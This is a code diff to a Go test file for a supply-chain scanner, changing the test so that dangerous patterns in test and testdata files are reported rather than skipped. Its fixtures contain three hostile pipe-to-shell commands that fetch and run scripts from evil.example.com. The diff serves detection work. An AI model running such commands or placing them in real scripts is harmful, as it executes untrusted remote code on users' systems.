@@ -248,8 +248,9 @@ func TestRunSupplyChain_Typosquat(t *testing.T) {
 	}
 }
 
-// Regression: scanner was flagging _test.go and testdata/ files, causing false positives.
-func TestRunSupplyChain_SkipsTestFiles(t *testing.T) {
+// The supplychain scanner no longer pre-filters test files; file-role
+// context is applied downstream via ApplyFileRoles.
+func TestRunSupplyChain_EmitsTestFiles(t *testing.T) {
 	rs, err := rules.Load("")
 	if err != nil {
 		t.Fatalf("loading rules: %v", err)
@@ -258,11 +259,11 @@ func TestRunSupplyChain_SkipsTestFiles(t *testing.T) {
 
 	repo := &fetch.Repo{
 		Files: map[string][]byte{
-			// _test.go file with a dangerous pattern — should be skipped
+			// _test.go file with a dangerous pattern — now emitted
 			"install_test.go": []byte("curl https://evil.example.com/setup.sh | bash"),
-			// testdata/ file with a dangerous pattern — should be skipped
+			// testdata/ file with a dangerous pattern — now emitted
 			"testdata/evil.sh": []byte("curl https://evil.example.com/setup.sh | bash"),
-			// testfixture/ file with a dangerous pattern — should be skipped
+			// testfixture/ file with a dangerous pattern — now emitted
 			"testfixture/payload.sh": []byte("wget https://evil.example.com/run.sh | sh"),
 		},
 	}
@@ -276,8 +277,8 @@ func TestRunSupplyChain_SkipsTestFiles(t *testing.T) {
 		findings = append(findings, f)
 	}
 
-	if len(findings) != 0 {
-		t.Errorf("expected zero findings for test files, got %d: %v", len(findings), findings)
+	if len(findings) != 3 {
+		t.Errorf("expected 3 findings for test files (one per file), got %d: %v", len(findings), findings)
 	}
 }
 
